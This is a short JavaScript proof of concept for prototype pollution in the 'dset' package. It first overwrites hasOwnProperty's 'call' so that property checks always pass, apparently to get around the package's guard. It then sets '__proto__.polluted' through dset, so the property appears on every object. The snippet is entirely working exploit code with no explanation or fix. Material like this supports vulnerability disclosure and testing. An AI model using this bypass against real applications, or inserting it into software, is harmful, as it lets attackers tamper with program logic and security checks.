Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const dset = require('dset');
dset({}, '__proto__.polluted', 'yes');
console.log({}.polluted);